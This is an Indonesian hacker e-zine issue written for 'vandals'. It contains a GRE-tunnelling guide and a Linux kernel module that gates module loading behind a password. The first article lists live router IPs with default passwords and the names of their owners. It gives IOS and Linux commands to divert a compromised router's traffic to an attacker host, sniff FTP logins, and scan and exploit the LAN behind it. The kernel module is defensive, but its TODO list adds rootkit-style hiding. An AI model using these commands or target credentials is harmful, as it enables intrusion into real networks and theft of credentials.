@@ -1,0 +1,2318 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Vandal New Year Edition TOKET!
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+--[1]-- Kecoak Elektronik License
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- Introductionz
+
+We call th1z article as a vandalzzz TOKET new year edition. Computer 
+vandalz, criminalz or undergroundz have to read thiz fucking stuff.
+Thiz editorial is unussual, we release thiz TOKET just in a single 
+article which containz of :
+
+0x01 - Fun With GRE Tunneling
+0x02 - Loadable Kernel Module Authentication
+0x03 - Distributed Password Cracking
+0x04 - Setting Up Botnet Using IE 0day
+0x05 - Kiddie Gamez With Metasploit 3.2
+0x06 - Share C0de - OpenBSD LKM Root Backdoor
+
+Yeah th1z is vandal edition, disagree with our opinion?? Shut The Fuck Up
+your mouth just watch and learn! We celebrate th1z new year by drinking, 
+smoking, hacking, reversing, cracking, and pwning da network. Thiz is our 
+way as computer hackerz (compalin?? I don't fucking care!!). Hacking isn't
+about developing, building, or breaking. It's about the spirit and state 
+of mind. WEWILLHACKFORHACKERZ Finally enjoy thiz TOKET and Happy new 
+year!
+
+~eL BytesKrew
+
+
+######################################################################
+		-- [0x01] -- Fun With GRE Tunneling
+######################################################################
+
+Saya yakin rekan-rekan sudah sering mendengar istilah tunneling, bahkan
+para pemula pun mestinya sudah cukup sering mendengar istilah tunneling
+ini. Pembaca pasti sering mendengar HTTP tunneling atau SSH tunneling
+yang sering digunakan untuk membypass proxy server. Tunneling tersebut
+berada di layer 7 model OSI. Berbeda dengan tunneling yang saya sebutkan
+GRE tunneling merupakan tunneling di layer 3 yang cukup banyak
+manfaatnya untuk mengamankan sekaligus memasuki sebuah jaringan.
+
+[0x01]-[1] GRE introduction
+
+GRE atau biasa dikenal dengan Generic Routing Encapsulation merupakan
+protokol tunneling yang digunakan untuk mengenkapsulasi berbagai
+protokol di layer network (layer 3 model OSI). GRE merupakan protokol
+yang dikembangkan oleh cisco, tetapi saat ini sudah diimplementasi di
+berbagai varian linux. Dengan menggunakan GRE sebuah paket IP bisa
+dienkapsulasi menjadi paket IP baru, kemudian dirouting berdasar pada
+header paket IP yang baru tersebut. GRE biasa digunakan pada pembuatan
+Virtual Private Network (VPN) tetapi pada artikel ini GRE digunakan
+untuk keperluan sniffing dan breaking LAN dibelakang NAT.
+
+GRE mengacu pada dokumen RFC 2784 memiliki struktur header paket seperti
+tergambar pada diagram berikut :
+
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ |C|       Reserved0       | Ver |         Protocol Type         |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+ |      Checksum (optional)      |       Reserved1 (Optional)    |
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+Checksum present (C/bit 0) bernilai 1, maka checksum dan Reserved1 ada
+pada header. Field checksum berisi informasi yang valid.
+
+Reserved0 (bits 1-12), penerima harus mengabaikan paket jika bit 1-5
+tidak bernilai 0 kecuali receiver mengimplementasikan RFC 1701, bit 6-12
+direservasi untuk kepentingan dimasa mendatang bernilai 0 dan harus
+diabaikan oleh penerima.   
+
+Version Number (bits 13-15), nomor versi harus bernilai 0
+
+Protocol Type (2 oktet), Field tipe protokol berisi payload paket. Tipe
+protokol ini didefinisikan pada RFC 1700 sebagai ETHER TYPES dan pada
+[ETYPES]. 
+
+Checksum (2 oktet), Field ini merupakan jumlah semua 16 bit word pada
+header GRE dan payload paket. Checksum bernilai 0 dan ada jika Checksum
+present bernilai 1.
+
+Reserved1 (2 oktet), field ini digunakan untuk kepentingan dimasa
+mendatang, jika ada harus bernilai 0. Reserved1 ada jika Checksum
+present bernilai 1.
+
+IPv4 sebagai payload, ketika IPv4 dibawa oleh GRE, maka tipe protokol
+harus bernilai 0x08.
+
+Konfigurasi tunneling GRE cisco bisa anda pelajari dari dokumentasi 
+milik cisco. Pada linux, GRE membutuhkan module kernel ip_gre dan untuk
+mengkonfigurasinya bisa dengan menggunakan iproute2. Dokumentasi
+iproute2 tersusun sangat rapi di website lartc.org.  
+
+[0x01]-[2] Man In The Middle - Sniffing Cisco Router
+
+Cisco router menggunakan sistem operasi IOS. IOS merupakan sistem
+operasi khusus yang berjalan pada cisco. Mungkin teman-teman sering
+berhasil mengkompromise sebuah cisco dengan melakukan mass scanning tapi
+tidak tahu apa yang selanjutnya bisa dilakukan. Pasang sniffer??ada yang
+bisakah memasang sniffer di IOS, melakukan backdooring dengan script
+TCL?? tidak semua IOS mendukung TCL, atau bagi yang kungfunya cukup
+tinggi bisa melakukan modifikasi IOS cisco menjadi sebuah rootkit??.
+Saya cenderung hanya melakukan sniffing ketika mendapatkan sebuah router
+cisco priviledge mode. Tetapi cara yang saya gunakan tidaklah rumit dan
+tidak butuh kungfu tinggi. Idenya dengan memanfaatkan GRE tunnel dan 
+merouting ulang paket data. Ide ini sudah ada sejak phrack 56 artikel 
+ditulis oleh gaius of HERT, hanya saja ide tersebut saya sederhanakan.
+
+Untuk mendapatkan sebuah router cisco yang live di internet anda bisa
+melakukan mass scanning dengan menggunakan tool yang pernah dibuat oleh
+salah satu staff kami. Google : "mass cisco scanner"
+Beberapa contoh live target yang masih bisa di masuki dengan default
+password adalah :
+
+telnet 203.130.1.225 password "cisco" 
+telnet 202.155.253.18 without password 
+telnet 222.124.142.105 password "cisco" Universitas Jambi Mendalo
+telnet 222.124.138.17 password "cisco" PT. Batam Matsushita Battery
+
+Once again, th1z is vandal edition! Tetapi live target di atas hanya
+menggunakan default password "cisco" untuk user level 1 saja. Semua demi
+kebaikan bersama karena vandal pun kami masih beretika :-)
+
+Untuk melakukan sniffing pada cisco router, langkah selanjutnya adalah 
+dengan mengkonfigurasi tunnel GRE pada sebuah router cisco dengan 
+pasangan PC linux yang keduanya harus mempunyai IP publik. Penulis 
+mengasumsikan bahwa kondisi jaringan yang digunakan adalah sebagai 
+berikut:
+
+
+.........................Server
+.........................(e)|
+............................|
+.........................Internet
+.........................../.\
+........................../...\
+.................(d)...../.....\.....(a)
+.... Linux Attacker-----/.......\-----Cisco Router-----|network target
+..................|===================|
+.................(c)....Tunnel GRE...(b)
+
+Catatan :
+(a) 203.124.1.209	(d) 218.51.80.23
+(b) 10.0.0.1		(e) 69.15.221.4
+(c) 10.0.0.2
+
+Pada kondisi normal, ketika user dari network target hendak mengakses
+server maka traffic datanya adalah :
+
+user->Cisco Router->internet->server
+
+tetapi untuk keperluan sniffing, attacker merouting ulang traffic
+sehingga arah trafficnya menjadi sebagai berikut :
+ 
+user->Cisco Router-> Linux Attacker(melalui Tunnel GRE)->internet->server
+
+Yang dilakukan attacker pada router cisco adalah :
+
+enable
+conf t
+ int tunnel0
+  ip address 10.0.0.1 255.255.255.0
+  tunnel mode gre ip
+  tunnel source 203.124.1.209
+  tunnel destinantion 218.51.80.23
+ctrl+z
+conf t
+  ip route 69.15.221.4 255.255.255.0 10.0.0.2
+  
+kemudian yang dilakukan pada mesin linux adalah :
+
+sysctl net.ipv4.ip_forward=1
+iptables -I INPUT 1 -p 47 -j ACCEPT
+modprobe ip_gre
+ip tunnel add tunnel0 mode gre remote 203.124.1.209 local 218.51.80.23
+ip link set tunnel0 up
+ip addr add 10.0.0.2/24 dev tunnel0
+modprobe iptable_nat
+iptables -A FORWARD -i tunnel0 -o eth0 -j ACCEPT
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+Ketika attacker sudah selesai mengetikkan semua perintah tersebut, maka
+jalur tunnel antar cisco router dengan PC linux attacker sudah
+terbentuk. Paket data dari network target ketika menuju ke server
+69.15.221.4 dilewatkan melalui PC linux attacker. Selanjutnya attacker
+mengaktifkan tcpdump agar mencapture semua paket data di eth0, AFAIK
+tcpdump yang saya gunakan untuk menulis artikel ini tidak bisa digunakan
+untuk melakukan sniffing protokol GRE pada interface tunnel0. Sehingga
+saya mengcapture data yang keluar dari eth0-nya. Perintah tcpdump
+berikut digunakan untuk mengcapture semua lalu lintas FTP dari/ke host
+69.15.221.4.
+
+tcpdump -nnevX -i eth0 host 69.15.221.4 and tcp port 21|tee 69.15-ftp.cap
+
+Untuk melihat hasil capture, attacker tinggal membaca file 69.15-ftp.cap
+dengan editor standar. Proses sniffing bisa dilakukan dengan toolz lain,
+hanya saja saya menggunakan tcpdump yang merupakan sniffer de facto
+standard di sistem operasi linux. Contoh file hasil capturenya tidak
+saya sertakan, teman-teman saja yang mencoba sendiri OK! (Penasaran??
+Bingung?? D0n't care!).
+
+[0x01]-[3] Breaking The LAN Through The Internet
+
+Pernah terpikirkan untuk melakukan scanning dan exploitasi mesin-mesin
+pada jaringan lokal (LAN) melalui sebuah server di internet? Mesin-mesin
+pada jaringan LAN biasanya menggunakan alamat IP pada jaringan
+10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 sesuai RFC 3330. Blok alamat
+IP tersebut tidak routeable di internet sehingga muncul adanya proses
+Network Address Translation (NAT). Lalu bagaimana untuk mengexploitasi
+dan scanning dibelakang NAT?? Sebenarnya ide yang pernah muncul sudah
+cukup banyak, hanya saja untuk kasus berikut ini saya lebih memilih
+menggunakan GRE tunnel sebagai solusi. Sebuah asumsi bahwa anda sudah 
+berhasil mentakeover sebuah router di sebuah jaringan, anda juga
+memiliki sebuah server di internet yang biasa digunakan untuk melakukan
+exploitasi. Misalnya arsitektur jaringan tersebut sebagai berikut :
+
+
+.........................Internet
+.........................../.\
+........................../...\
+.................(d)...../.....\.....(a)
+.... Linux Attacker-----/.......\-----Router-----|network target (e)
+..................|===================|
+.................(c)....Tunnel GRE...(b)
+
+Catatan:
+(a) 147.122.100.33 	(d) 202.155.1.34
+(b) 10.0.0.1		(e) 192.168.0.0/24
+(c) 10.0.0.2
+
+Jika router yang ada pada jaringan tersebut adalah mesin linux, *BSD,
+atau mesin dengan sistem operasi yang familiar, maka exploitasi
+network target bisa dengan mudah dilakukan dari router (asumsi router
+sudah berhasil ditakeover). Bayangkan jika router tersebut adalah router
+cisco dengan IOS, anda akan melakukan exploitasi network target tersebut
+dari router cisco tersebut?? Kalo jawaban anda iya dan hasil exploitasi
+yang dilakukan berhasil dengan memuaskan, saya akan segera mengkontak 
+anda kemudian membawakan 5 botol beer untuk anda, gratiz! Hanya saja
+saya minta tolong diwariskan ilmunya :-). 
+
+Kita lanjut cerita breaking LAN behind the NAT-nya. Kofigurasi tunnel 
+di router cisco adalah sebagai berikut :
+
+enable
+conf t
+ int tunnel0
+  ip address 10.0.0.1 255.255.255.0
+  tunnel mode gre ip
+  tunnel source 147.122.100.33
+  tunnel destinantion 202.155.1.34
+ctrl+z
+
+Saya asumsikan di router cisco tidak ada access list yang melakukan
+filtering. Jika ternyata ada ACL yang membatasi silakan dihack ACL-nya.
+Sedangkan konfigurasi tunnel untuk linux yang digunakan attacker adalah: 
+
+iptables -I INPUT 1 -p 47 -j ACCEPT
+modprobe ip_gre
+ip tunnel add tunnel0 mode gre remote 147.122.100.33 local 202.155.1.34
+ip link set tunnel0 up
+ip addr add 10.0.0.2/24 dev tunnel0
+route add -net 192.168.0.0/24 gw 10.0.0.1
+
+Setelah semua selesai, periksalah tabel routing sistem operasi apakah
+sudah sesuai yang diharapkan.
+
+staff@eleet:~# netstat -nr
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt
+Iface
+147.122.100.32  0.0.0.0         255.255.255.240 U         0 0          0
+eth0
+10.0.0.0        0.0.0.0         255.255.255.0   U         0 0          0
+tunnel0
+192.168.0.0     10.0.0.1        255.255.255.0   UG        0 0          0
+tunnel0
+169.254.0.0     0.0.0.0         255.255.0.0     U         0 0          0
+eth0
+0.0.0.0         147.122.100.33  0.0.0.0         UG        0 0          0
+eth0
+staff@eleet:~# ping 10.0.0.1 -c 3
+PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
+64 bytes from 10.0.0.1: icmp_seq=0 ttl=255 time=288 ms
+64 bytes from 10.0.0.1: icmp_seq=1 ttl=255 time=287 ms
+64 bytes from 10.0.0.1: icmp_seq=2 ttl=255 time=288 ms
+
+--- 10.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+rtt min/avg/max/mdev = 287.874/288.070/288.297/0.643 ms, pipe 2
+staff@eleet:~# 
+
+Okai semua sudah berjalan sebagaimana mestinya, sekarang mulailah
+scanning pada jaringan LAN 192.168.0.0/24 dari mesin linux attacker.
+
+staff@eleet:~#nmap -sP -vv 192.168.0.1/24 -oN host-tunnel.txt
+
+(..edited..)
+
+staff@eleet:~# cat host-tunnel.txt
+# nmap 3.70 scan initiated Wed Dec 24 22:04:07 2008 as: nmap -sP -vv -oN
+> host-tunnel.txt 192.168.0.1/24 
+Host 192.168.0.1 appears to be up.
+Host 192.168.0.2 appears to be up.
+Host 192.168.0.3 appears to be up.
+Host 192.168.0.9 appears to be up.
+Host 192.168.0.10 appears to be up.
+Host 192.168.0.11 appears to be up.
+Host 192.168.0.12 appears to be up.
+Host 192.168.0.13 appears to be up.
+Host 192.168.0.15 appears to be up.
+Host 192.168.0.21 appears to be up.
+Host 192.168.0.23 appears to be up.
+Host 192.168.0.29 appears to be up.
+Host 192.168.0.32 appears to be up.
+Host 192.168.0.39 appears to be up.
+Host 192.168.0.59 appears to be up.
+Host 192.168.0.114 appears to be up.
+# Nmap run completed at Wed Dec 24 22:04:24 2008 -- 256 IP addresses (16
+hosts up) scanned in 17.341 seconds
+staff@eleet:~# nmap -sV -vv -p 22,135,139,445 -P0 -oN enumerate.txt \
+> 192.168.0.0/24
+
+(..edited..)
+
+staff@eleet:~# less enumerate.txt
+nteresting ports on 192.168.0.8:
+PORT    STATE    SERVICE      VERSION
+22/tcp  filtered ssh
+135/tcp filtered msrpc
+139/tcp filtered netbios-ssn
+445/tcp filtered microsoft-ds
+
+Interesting ports on 192.168.0.9:
+PORT    STATE  SERVICE      VERSION
+22/tcp  closed ssh
+135/tcp open  msrpc        Microsoft Windows msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+
+Interesting ports on 192.168.0.10:
+PORT    STATE  SERVICE      VERSION
+22/tcp  closed ssh
+135/tcp open  msrpc        Microsoft Windows msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+
+Interesting ports on 192.168.0.11:
+PORT    STATE  SERVICE      VERSION
+22/tcp  closed ssh
+135/tcp open  msrpc        Microsoft Windows msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+
+
+Game Over! Host pada jaringan LAN dibelakang router cisco bisa
+dienumerasi oleh nmap yang menunjukkan bahwa ada 16 alamat IP yang hidup 
+di LAN target. Selanjutnya attacker bisa saja melakukan scanning port. 
+Attacker bisa memilih port mana saja yang hendak discan, misalnya 
+memilih port SMB (445) yang mana pada windows bisa diexploitasi secara
+remote untuk memperoleh full priviledge (bugs ms08-067). Ingat pada 
+jaringan LAN biasanya sebagian besar adalah windows!
+
+BONUZ: Jika anda mendapatkan full priviledge router mikrotik, anda bisa
+menggunakan IPIP tunnel. AFAIK pada mikrotik adanya EOIP tunnel bukan
+GRE tunnel. Konfigurasi IPIP tunnelnya :
+
+[admin@MikroTik] > /interface ipip
+[admin@MikroTik] interface ipip> add
+local-address: 147.122.100.33
+remote-address: 202.155.1.34 
+[admin@MikroTik] interface ipip> print
+Flags: X - disabled, R - running 
+ #    NAME   MTU   LOCAL-ADDRESS   REMOTE-ADDRESS 
+ 0 X  ipip1  1480  147.122.100.33  202.155.1.34
+[admin@MikroTik] interface ipip> en 0
+[admin@MikroTik] interface ipip> /ip address add address 10.0.0.1/24 \
+\... interface ipip1
+[admin@MikroTik] interface ipip>
+
+
+GAME OVER!
+
+
+
+######################################################################
+	-- [0x02] -- Loadable Kernel Module Authentication
+######################################################################
+
+Sebuah sistem operasi bisa digambarkan dalam beberapa lapis. Lapisan
+teratas adalah lapisan yang langsung berinteraksi dengan user. Lapisan
+ini biasanya berupa interface yang menarik dan mudah digunakan. Tetapi
+bagaimana sistem operasi berinteraksi dengan hardware?? jawabannya
+adalah melalui kernel. Kernel merupakan lapisan terbawah dari sistem
+operasi yang langsung berinteraksi dengan hardware. Kernel ini jugalah
+yang sebenarnya menjadi jantung sistem operasi. 
+
+[0x02]-[1] Modular Kernel Introduction
+
+Saya yakin banyak rekan-rekan pembaca di sini yang mengetahui tentang 
+kernel monolitik dan kernel modular?? Kernel monolitik memiliki 
+keunggulan dalam hal keamanan tetapi tidak fleksible. Bisa dikatakan 
+lebih aman karena kernel monolitik tidak bisa ditambah modul kernel, 
+sehingga tidak memungkinkan bagi attacker menanam rootkit dalam bentuk 
+modul. Tetapi tidak fleksible ketika dibutuhkan modul baru jika ada 
+penambahan hardware. Lalu bagaimana dengan kernel modular?
+Kernel modular terdiri dari modul-modul yang bisa dipasang dan dilepas
+secara dinamik dari kernel. Nah pertanyaannya, bagaimana jika seorang
+attacker (unauthorized user) menyisipkan modul jahat ke dalam kernel.
+Tentu saja itu menjadi sebuah bencana yang harus dihindari. System
+logging dan kebanyakan tool hanya mendeteksi diload dan unloadnya sebuah
+modul kernel yang bisa dengan mudah dimanipulasi. Satu solusi yang
+penulis tawarkan adalah dengan mengauthentikasi user root sebelum meload
+sebuah modul ke dalam kernel. Hal ini berguna ketika root server kita di
+takeover oleh penyusup agar penyusup tersebut tidak bisa menginsertkan
+modul jahat ke kernel (Ingat : mencegah lebih baik daripada mendeteksi).
+Pada artikel ini saya menggunakan sistem operasi linux, karena kernelnya
+cukup menyenangkan dan oprek-able :-). Beberapa hal yang perlu diproteksi 
+pada kernel sistem operasi linux antar lain :
+
+ - Mencegah loading dan unloading modul kernel dengan memodifikasi system
+   call dengan menggunakan loadable kernel module.
+ - Mencegah di replace-nya image kernel linux dengan kernel yang sudah
+   di patch oleh attacker.
+ - Mencegah dimodifikasinya konfigurasi boot loader (lilo/grub) sehingga
+   mengarah ke image kernel yang sudah dipatch oleh attacker.
+ - Mencegah proses modifikasi system call dengan melalui infeksi kmem.
+
+Dengan konsep pencegahan diatas, seorang sysadmin linux yang menguasai
+kernel programming, bisa membuat sebuah modul kernel untuk keperluan
+authentikasi saat mengubah hal yang terkait dengan kernel sistem operasi.
+
+[0x02]-[2] Syscall Tracking
+
+Saat kita mengeksekusi perintah-perintah di sistem operasi linux
+sebenarnya kita memanggil system call (syscall) tertentu. System call
+yang kita panggil bisa ditelusuri menggunakan perintah 'strace'. Misal
+untuk mengetahui syscall apa yang panggil ketika meload dan mengunload
+module ke kernel sebagai berikut.
+
+root@eleet:~# strace -o modprobe.trace modprobe ip_gre
+root@eleet:~# lsmod |grep ip_gre
+ip_gre                 19076  0 
+root@eleet:~# tail -10 modprobe.trace 
+read(4, "ata_acpi 12160 0 - Live 0xf88c30"..., 1024) = 781
+read(4, "", 1024)                       = 0
+close(4)                                = 0
+munmap(0xb7eeb000, 4096)                = 0
+fstat64(3, {st_mode=S_IFREG|0644, st_size=25840, ...}) = 0
+mmap2(NULL, 25840, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7ee5000
+init_module(0xb7ee5000, 25840, "")      = 0
+munmap(0xb7ee5000, 25840)               = 0
+close(3)                                = 0
+exit_group(0)                           = ?
+root@eleet:~# strace -o rmmod.trace rmmod ip_gre
+root@eleet:~# lsmod |grep ip_gre
+root@eleet:~# tail -10 rmmod.trace 
+brk(0)                                  = 0x91bb000
+brk(0x91dc000)                          = 0x91dc000
+open("/proc/modules", O_RDONLY)         = 3
+fstat64(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1,
+0) = 0xb7ffd000
+read(3, "ip_gre 19076 0 - Live 0xf8ef7000"..., 1024) = 1024
+close(3)                                = 0
+munmap(0xb7ffd000, 4096)                = 0
+delete_module("ip_gre")                 = 0
+exit_group(0)                           = ?
+root@eleet:~# strace -o insmod.trace insmod \
+/lib/modules/2.6.27-9-generic/kernel/net/ipv4/ip_gre.ko
+root@eleet:~# lsmod |grep ip_gre
+ip_gre                 19076  0 
+root@eleet:~# tail -10 insmod.trace 
+munmap(0xb7fd2000, 54426)               = 0
+brk(0)                                  = 0x9243000
+brk(0x9264000)                          = 0x9264000
+open("/lib/modules/2.6.27-9-generic/kernel/net/ipv4/ip_gre.ko",
+O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\1\0\3\0\1\0\0\0\0\0\0\0"...,
+16384) = 16384
+read(3, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"...,
+16384) = 9456
+read(3, "", 6928)                       = 0
+close(3)                                = 0
+init_module(0x9243018, 25840, "")       = 0
+exit_group(0)                           = ?
+root@eleet:~# 
+ 
+Dari hasil syscall tracking di atas diketahui bahwa proses load module
+ke kernel baik menggunakan 'modprobe' ataupun 'insmod' memanfaatkan
+syscall init_module() sedangkan proses unload module menggunakan rmmod
+memanfaatkan syscall delete_module(). Beberapa syscall yang akan 
+dimodifikasi lainnya untuk keperluan proteksi kernel adalah syscall 
+unlink(). 
+
+Mungkin rekan-rekan bertanya, modifikasi syscall init_module() bukannya
+hanya mencegah proses di loadnya modul ke kernel? Bagaimana kalo
+attacker mereplace image kernel, memodifikasi konfigurasi bootloader
+atau melakukan patching runtime kmem?? Silakan cari sendiri, kami editor
+menyiapkan semua artikel ini kurang dari 10 hari. Sebagai petunjuk saja,
+melakukan modifikasi stat64() seharusnya bisa mencegah direplacenya
+image kernel dan dieditnya bootloader.
+
+[0x02]-[3] Developing Authentication Module
+
+Proses authentikasi untuk meload modul ke dalam kernel dilakukan dengan
+memodifikasi syscall init_module() dan syscall unlink(). Syscall
+unlink() digunakan untuk mengauthentikasi user. Saya menggunakan syscall
+unlink karena pada saat melakukan coding syscall unlink() lah yang
+terpikirkan, selain itu parameter syscall unlink() juga cukup sederhana.
+
+User harus menentukan secara manual alamat syscall table, bisa dilakukan
+dengan melihat file System.map untuk kernel yang sedang berjalan.
+
+root@eleet:/usr/src# cat xinsmod.c
+/*
+Tested in Linux node0 2.6.20-17-generic #2 SMP
+cat /boot/System.map-2.6.20-17-generic |grep sys_call_ta
+c02f4500 R sys_call_table
+
+Re-tested again in 
+root@eleet:/usr/src# uname -a
+Linux eleet 2.6.20-17-server #2 SMP Wed Aug 20 16:54:26 UTC 2008 i686 GNU/Linux
+root@eleet:/usr/src# cat /boot/System.map-2.6.20-17-server |grep sys_call_t
+c02fb500 R sys_call_table
+*/
+
+#include <linux/module.h> 
+#include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/moduleparam.h>
+#include <linux/kernel.h> 
+#include <linux/init.h> 
+#include <linux/unistd.h> 
+#include <linux/syscalls.h>
+#include <asm/uaccess.h>
+
+/*user configuration*/
+void **sys_call_table = (void *)0xc02fb500;
+/*end*/
+int lock=1;
+asmlinkage int (*o_unlink) (const char *pathname); 
+asmlinkage int (*o_init) (void *umod,unsigned long len,char *uargs);
+
+asmlinkage int my_unlink(const char *pathname) 
+{
+  char *pass="l3tz0p3n";
+  char *locked="l0ck3d";
+  char *kname=(char *)kmalloc(256,GFP_KERNEL); 
+  int ret;	
+  
+  copy_from_user(kname,pathname,255);
+
+  if(strcmp(kname,pass)==0){
+    lock=0;
+    printk(KERN_INFO "SYS_UNLINK  : init_module successfully unlocked\n");
+    kfree(kname);
+    return 0;
+  }
+  else if(strcmp(kname,locked)==0){
+    lock=1;
+    printk(KERN_INFO "SYS_UNLINK  : init_module successfully locked\n");
+    kfree(kname);
+    return 0;
+  }else{
+    kfree(kname);
+    ret=o_unlink(pathname);
+  }
+  return ret;
+} 
+
+asmlinkage int my_init(void *umod,unsigned long len,char *uargs)
+{
+  int ret;
+  if(lock==1){
+    printk(KERN_INFO "SYS_INIT_MODULE : module loading denied!\n");
+    return 0;
+  }else{
+    ret=o_init(umod,len,uargs);
+    printk(KERN_INFO "SYS_INIT_MODULE : module loaded successfully\n");
+    return ret;
+  }
+  return ret;
+}
+
+int init_module(void)
+{
+  o_unlink=sys_call_table[__NR_unlink];
+  sys_call_table[__NR_unlink]=my_unlink;
+  o_init=sys_call_table[__NR_init_module];
+  sys_call_table[__NR_init_module]=my_init;
+  return 0;
+}
+
+/* permanent module untill rebooted
+   cleanup_module's disabled
+*/
+void cleanup_module(void)
+{
+  sys_call_table[__NR_unlink]=o_unlink; 
+  sys_call_table[__NR_init_module]=o_init;
+}
+
+root@eleet:/usr/src# cat unlock.c
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+ if(argc!=3){
+   printf(" Usage : %s [-l|-u] <junk>\n -u to unlock and -l to lock\n",argv[0]);
+   exit(0);
+ }
+ char sw,*pwd;
+ while((sw=getopt(argc,argv,"u:l"))!=EOF){
+   switch(sw)
+   {
+     case 'u' :
+       printf("Enter secret code to unlock init_module\n");
+       pwd = getpass("password : ");
+       unlink(pwd);
+       break;
+     case 'l' :
+       unlink("l0ck3d");
+       break;
+     default :
+       printf("Unsupported option\n");
+       break;
+   }
+ }
+}
+
+root@eleet:/usr/src# cat Makefile
+
+obj-m += xinsmod.o
+CC=cc
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	$(CC) -o unlock unlock.c
+
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	rm -f unlock
+
+root@eleet:/usr/src# uname -a
+Linux anto 2.6.20-17-server #2 SMP Wed Aug 20 16:54:26 UTC 2008 i686 GNU/Linux
+root@eleet:/usr/src# cat /etc/issue
+Ubuntu 7.10 \n \l
+
+root@eleet:/usr/src# make
+make -C /lib/modules/2.6.20-17-server/build M=/usr/src/devel modules
+make[1]: Entering directory `/usr/src/linux-headers-2.6.20-17-server'
+  CC [M]  /usr/src/devel/xinsmod.o
+  Building modules, stage 2.
+  MODPOST 1 modules
+  CC      /usr/src/devel/xinsmod.mod.o
+  LD [M]  /usr/src/devel/xinsmod.ko
+make[1]: Leaving directory `/usr/src/linux-headers-2.6.20-17-server'
+cc -o unlock unlock.c
+root@eleet:/usr/src# insmod xinsmod.ko 
+root@eleet:/usr/src# lsmod |grep xinsm
+xinsmod                 3592  0
+root@eleet:/usr/src#
+
+Sekarang saya mencoba meload modul ip_gre ke kernel sambil mengamati
+file /var/log/messages. Hasilnya sebagai berikut :
+
+root@eleet:/usr/src# modprobe ip_gre
+root@eleet:/usr/src#
+
+di /var/log/messages
+
+Dec 26 02:03:37 eleet kernel: [ 1707.777557] SYS_INIT_MODULE : module
+loading denied!
+
+Kemudian saya mengauthentikasi dulu sebelum menload module ip_gre dengan
+'unlock'. Hasilnya sebagai baerikut :
+
+root@eleet:/usr/src# ./unlock -u junk
+Enter secret code to unlock init_module
+password : 
+root@eleet:/usr/src# modprobe ip_gre
+root@eleet:/usr/src#
+
+di /var/log/messages
+
+Dec 26 02:06:16 eleet kernel: [ 1867.147555] SYS_UNLINK  : init_module
+successfully unlocked
+Dec 26 02:06:19 eleet kernel: [ 1870.382547] GRE over IPv4 tunneling
+driver
+Dec 26 02:06:19 eleet kernel: [ 1870.382930] SYS_INIT_MODULE : module
+loaded successfully
+
+Saya sudah selesai melakukan penambahan modul pada kernel linux,
+selanjutnya saya harus mengunci kembali kernel modular agar tidak bisa
+ditambah modul oleh sembarang orang.
+
+root@eleet:/usr/src# ./unlock -l junk
+root@eleet:/usr/src#
+
+di /var/log/messages
+
+Dec 26 02:09:45 eleet kernel: [ 2076.563270] SYS_UNLINK  : init_module
+successfully locked
+
+Yupe, artikel dan toolsnya begitu saja, silakan dikembangkan sendiri.
+Sebagai catatan sebelum mencoba toolz ini ada baiknya menggunakan linux
+dengan kernel yang sudah saya coba. Percobaan menggunakan kernel linux
+lain silakan saja tapi kalo hasilnya tidak sesuai yang diharapkan jangan
+salahkan saya. User ur own brain!
+
+[0x02]-[4] TODO
+
+1. Hide th1z module from lsmod, /proc/modules, /proc/kallsyms
+2. Create th1z module unremovable, da easiest way by removing
+   cleanup_module() function. 
+3. fstat64() modification to protect kernel image
+4. fstat64() modification to protect bootloader configuration
